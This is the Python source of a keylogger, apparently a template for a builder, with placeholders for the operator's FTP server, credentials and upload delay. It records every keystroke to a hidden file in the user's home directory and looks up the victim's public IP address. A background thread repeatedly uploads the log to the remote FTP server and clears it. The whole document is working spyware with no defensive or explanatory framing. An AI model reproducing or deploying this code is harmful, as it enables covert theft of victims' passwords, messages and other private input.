from pynput import keyboard
from threading import Thread
from requests import get
from datetime import datetime
from time import sleep
import os, ftplib
from sys import platform
SERVER = "$SERVER"
PORT = $PORT
TLS = $TLS
USERNAME = "$USERNAME"
PASSWORD = "$PASSWORD"
LABEL = "$LABEL"
DELAY = $DELAY
ip = get("https://api.ipify.org").content.decode()
file = 	os.path.expanduser("~/.log.txt")
with open(file, "a") as f:
    pass
if platform in ['Windows', 'win32', 'cygwin']:
    os.system("attrib +h " + file)
def addToSend(key):
    with open(file, "a", encoding="UTF-8") as f:
        f.write(key)
def on_press(key):
    key = str(key)
    good = [["Key.space", " "],["Key.enter", "[Ent]\n"],["Key.shift", "[Sh]"],["Key.insert", "[Ins]"],["Key.backspace", "[Bck]"],["Key.alt_l", "[Alt L]"],["Key.alt_r", "[Alt R]"],["Key.ctrl_l", "[Ctrl L]"],["Key.ctrl", "[Ctrl]"],["Key.ctrl_r", "[Ctrl R]"],["Key.caps_lock", "[Caps]"],["Key.down", "[Down Arrow]"],["Key.right", "[Right Arrow]"],["Key.left", "[Left Arrow]"],["Key.up", "[Up Arrow]"],["Key.shift_r", "[Shift R]"],["Key.shift_l", "[Shift L]"],["Key.tab", "[Tab]"],["", ""]]
    for i in range(len(good)):
        if good[i][0] == key:
            key = good[i][1]
            break
    if key != "\"'\"":
        key = key.replace("'", "")
    elif key == "\"'\"":
        key = key.replace('"', "")
    addToSend(key)
def upload_file_ftp(server, port, tls, username, password, label, file, ip, waiting):
    while 1:
        sleep(waiting)
        if os.stat(file).st_size != 0:
            if tls:
                session = ftplib.FTP_TLS()
            else:
                session = ftplib.FTP()
            session.connect(server, port)
            session.login(username, password)
            file_ = open(file, 'r+b')
            session.storlines("STOR " + ip + " " + label + " " + str(datetime.now()) + ".txt", file_)
            file_.truncate(0)
            file_.close()
            session.quit()
keyboard.Listener(on_press=on_press).start()
Thread(target=upload_file_ftp, args=(SERVER, PORT, TLS, USERNAME, PASSWORD, LABEL, file, ip, DELAY)).start()
